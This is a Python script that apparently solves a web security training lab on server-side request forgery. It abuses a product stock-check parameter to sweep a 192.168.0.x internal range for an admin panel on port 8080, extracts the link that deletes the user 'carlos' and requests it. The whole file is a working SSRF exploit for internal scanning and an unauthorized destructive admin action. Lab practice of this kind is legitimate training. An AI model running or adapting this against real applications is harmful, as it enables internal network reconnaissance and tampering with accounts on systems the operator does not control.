import re
import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

url_base = input("Enter your lab url: ") #https://YOUR-LAB-ID.web-security-academy.net
full_url = urljoin(url_base, "product/stock")

print("Scanning local network 192.168.0.X ...")

for i in range(1,255):
    target_url = f"http://192.168.0.{i}:8080/admin"
    payload = {'stockApi': target_url}
    try:
        r = requests.post(full_url, payload, timeout=(0.5,2))
        sys.stdout.write(f"Testing {target_url} - Status {r.status_code}\r\n")
        sys.stdout.flush()
        if r.status_code == 200:
            print("\n=====================================")
            print(f"[+] Found target: {target_url}")
            print("[+] Admin panel found!")
            soup = BeautifulSoup(r.text, "html.parser")
            tag = soup.find("a", href=re.compile('http:.*carlos'))
            final_act = tag['href']
            payload['stockApi'] = final_act.lstrip("/")
            r = requests.post(full_url, payload)
            print("\nSuccessfully Deleted username Carlos!!!")
            break
    except requests.exceptions.ReadTimeout:
        print("- Request timeout!!!")
    except requests.exceptions.ConnectTimeout:
        print("- Connection timeout!!! - Notice your url")
    except requests.exceptions.ConnectionError:
        print(" - Error in transmission!!!")
    except Exception as e:
        pass
